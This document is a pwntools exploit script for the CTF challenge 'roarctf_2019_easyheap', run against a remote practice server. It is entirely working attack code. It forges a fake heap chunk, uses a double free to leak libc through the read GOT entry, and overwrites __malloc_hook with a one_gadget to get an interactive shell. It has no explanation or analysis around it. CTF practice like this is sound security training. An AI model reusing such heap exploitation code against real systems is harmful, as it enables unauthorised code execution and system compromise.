from pwn import *

r = remote("node4.buuoj.cn", 28365)
#r = process("./roarctf_2019_easyheap")

context.log_level = 'debug'
DEBUG = 0
elf = ELF("./roarctf_2019_easyheap")
libc = ELF('../../libc_file/16-64-libc-2.23.so')
one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]
fake_chunk = 0x602060
read_got = elf.got['read']


menu = ">> "
def add(size, content, blind = False):
	if not blind:
		r.recvuntil(menu)
	else:
		sleep(0.3)
	r.sendline('1')
	if not blind:
		r.recvuntil("input the size\n")
	else:
		sleep(0.3)
	r.sendline(str(size))
	if not blind:
		r.recvuntil("please input your content\n")
	else:
		sleep(0.3)
	r.send(content)

def delete(blind = False):
	if not blind:
		r.recvuntil(menu)
	else:
		sleep(0.3)
	r.sendline('2')


def show():
	r.recvuntil(menu)
	r.sendline('3')


def secret(type, content='', blind = False):
	if not blind:
		r.recvuntil(menu)
	else:
		sleep(0.3)
	r.sendline('666')
	if not blind:
		r.recvuntil("build or free?\n")
	else:
		sleep(0.3)
	r.sendline(str(type))	#1.add 2.free
	if type == 1:
		if not blind:
			r.recvuntil("please input your content\n")
		else:
			sleep(0.3)
		r.send(content)
		
r.recvuntil("please input your username:")
payload = p64(0) + p64(0x71) + '\x00'*0x10
r.send(payload)
r.recvuntil("please input your info:")
r.send('b'*0x20)

secret(1, 'a'*0xa0)
add(0x60, 'chunk1\n')
secret(2)
add(0x60, 'chunk0part\n')
add(0x60, 'chunk2\n')
delete()
secret(2)
delete()

add(0x60, p64(fake_chunk))
add(0x60, 'a\n')
add(0x60, 'b\n')
payload = 'a'*0x18 + p64(read_got) + p64(0xDEADBEEFDEADBEEF)
add(0x60, payload)

show()
read_addr = u64(r.recvuntil('\x7f').ljust(8, '\x00'))
libc.address = read_addr - libc.symbols['read']
one_gadget = libc.address + one_gadget_16[3]
malloc_hook = libc.sym['__malloc_hook']
realloc = libc.sym['realloc']
success("malloc_hook"+hex(malloc_hook))
success("libc_base:"+hex(libc.address))

secret(1, 'a', blind = True)
secret(1, 'a'*0xa0, True)
add(0x60, 'b'*0x60, True)
secret(2, blind = True)
add(0x60, 'c'*0x60, True)
add(0x60, 'd'*0x60, True)
delete(True)
secret(2, blind = True)
delete(True)

add(0x60, p64(malloc_hook-0x23), True)
add(0x60, 'a'*0x60, True)
add(0x60, 'b'*0x60, True)
payload = '\x00'*(0x13-8) + p64(one_gadget) + p64(realloc+0x14)
add(0x60, payload, True)
#sleep(0.3)
r.sendline('1')
sleep(0.3)
r.sendline('10')

r.sendline("exec 1>&0")
r.interactive()